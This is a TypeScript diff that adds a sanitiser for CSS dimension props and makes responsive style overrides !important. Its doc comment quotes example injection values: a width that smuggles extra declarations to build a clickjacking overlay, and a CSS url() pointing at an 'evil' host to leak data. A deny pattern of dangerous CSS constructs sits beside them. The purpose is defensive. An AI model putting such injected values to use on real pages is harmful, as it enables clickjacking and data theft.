@@ -31,6 +31,23 @@ function clean(v: unknown): string | number | undefined {
   return s;
 }
 
+/**
+ * Sanitise a value that reaches an inline style through `node.props` rather than
+ * the style bag — the dimension props (`width`, `gutter`, `min`, `height`) read
+ * directly by Section/Container/Grid/Spacer. These bypass `resolveStyle`, so
+ * without this guard an authored `width="100px;position:fixed;top:0"` injects a
+ * clickjacking overlay and `gutter="url(https://evil/?leak)"` exfiltrates via CSS.
+ * Rejects and falls back rather than partially sanitising: a dimension is short.
+ */
+export function safeDim(v: unknown, fallback: string): string {
+  const s = v == null ? '' : String(v);
+  if (!s) return fallback;
+  if (s.length > 64) return fallback;
+  if (/[<>{};]/.test(s)) return fallback;
+  if (/expression\(|javascript:|vbscript:|@import|url\s*\(|image-set\s*\(|cross-fade\s*\(/i.test(s)) return fallback;
+  return s;
+}
+
 /** Resolve a StyleProps into a React inline-style object (base breakpoint only). */
 export function resolveStyle(style?: StyleProps): CSSProperties {
   if (!style) return {};
@@ -68,22 +85,34 @@ function kebab(k: string): string {
   return k.replace(/[A-Z]/g, (m) => `-${m.toLowerCase()}`);
 }
 
-function declarations(css: CSSProperties): string {
+function declarations(css: CSSProperties, important = false): string {
+  const bang = important ? ' !important' : '';
   return Object.entries(css)
-    .map(([k, v]) => `${kebab(k)}:${typeof v === 'number' ? v : v}`)
+    .map(([k, v]) => `${kebab(k)}:${typeof v === 'number' ? v : v}${bang}`)
     .join(';');
 }
 
 const BREAKPOINTS = { sm: 640, md: 768, lg: 1024 } as const;
 
-/** Generate scoped media-query CSS for a node's responsive overrides. */
+/**
+ * Generate scoped media-query CSS for a node's responsive overrides.
+ *
+ * Declarations are marked `!important`. A node's BASE style is rendered as an
+ * inline `style=` attribute, and an inline style outranks every class selector
+ * no matter what media query wraps it — so without `!important`, `md:size=4rem`
+ * simply never applied over a base `size=12px`, at any viewport. The atoms also
+ * merge their own defaults into that same inline object, so moving the base out
+ * to a class instead would let atom defaults beat the author's overrides.
+ * `!important` is scoped to the node's own `.ak-<id>` class; values are already
+ * sanitised by `clean()`, which rejects `;`, so a value cannot forge one.
+ */
 export function mediaCss(selector: string, responsive?: StyleProps['responsive']): string {
   if (!responsive) return '';
   let css = '';
   for (const bp of ['sm', 'md', 'lg'] as const) {
     const s = responsive[bp];
     if (!s) continue;
-    const decls = declarations(resolveStyle(s));
+    const decls = declarations(resolveStyle(s), true);
     if (decls) css += `@media (min-width:${BREAKPOINTS[bp]}px){${selector}{${decls}}}`;
   }
   return css;
